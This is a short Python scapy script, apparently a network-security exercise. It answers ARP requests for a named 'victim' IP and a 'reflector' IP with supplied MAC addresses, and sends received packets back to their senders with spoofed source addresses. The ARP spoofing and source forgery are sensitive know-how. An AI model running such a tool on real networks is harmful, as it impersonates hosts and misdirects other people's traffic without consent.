#!/usr/bin/python
# given = victim IP, victim eth, reflector ip, reflector eth0
from scapy.all import *
import sys

## INITIALIZE VARIABLES##
total = len(sys.argv)
cmdargs = list((sys.argv))
interface = cmdargs[2]
vip = cmdargs[4]
veth= cmdargs[6]
rip= cmdargs[8]
reth= cmdargs[10]
# vip = '192.168.1.10'
# veth= '31:16:A9:63:FF:83'
# rip= '192.168.1.20'
# reth= '38:45:E3:89:B5:56'
# interface = 'eth0'
# print (interface,vip,veth,rip,reth)
# print ('asdfgadf')
############################

####### ARP RESPONSE ########
def makeARP(ip,eth,pkt):
    arpResponse = ARP()
    arpResponse[ARP].hwdst=pkt[ARP].hwsrc
    arpResponse[ARP].hwsrc=eth
    arpResponse[ARP].pdst=pkt[ARP].psrc
    arpResponse[ARP].psrc=ip
    arpResponse[ARP].op=2

    # print (arpResponse.show())
    send(arpResponse,iface=interface)
    print ('----------SENT ARP RESPONSE-------------')

#############################

######### REFLECT #############
def reflect(pkt):
    if pkt.haslayer(ARP): # if ARP request
        if pkt[ARP].pdst == vip: # if arp request for Victim IP
            makeARP(vip,veth,pkt)
        elif pkt[ARP].pdst == rip: # if arp request for Reflector IP
            makeARP(rip,reth,pkt)
    elif pkt.haslayer(IP):
        print ('------------ Received TCP/UDP/ICMP-----------')
        # print (pkt.show())
        del pkt[IP].chksum
        dst = pkt[IP].dst
        pkt[IP].dst = pkt[IP].src
        if dst == vip:
            pkt[IP].src=rip
            if TCP in pkt:
                del pkt[TCP].chksum
                print ('-----------SENT TCP-----------')
            elif ICMP in pkt:
                del pkt[ICMP].chksum
                print ('-----------SENT ICMP-----------')
            elif UDP in pkt:
                del pkt[UDP].chksum
                print ('-----------SENT UDP-----------')
            reflectPkt=pkt[IP]
            send(reflectPkt, iface=interface)

        elif dst == rip:
            pkt[IP].src = vip
            if TCP in pkt:
                del pkt[TCP].chksum
                print ('-----------SENT TCP-----------')
            elif ICMP in pkt:
                del pkt[ICMP].chksum
                print ('-----------SENT ICMP-----------')
            elif UDP in pkt:
                del pkt[UDP].chksum
                print ('-----------SENT UDP-----------')
            reflectPkt=pkt[IP]
            send(reflectPkt, iface=interface)


#################################################################

###############################
###### Sniff interface #########
sniff (iface=interface, prn = reflect)
################################
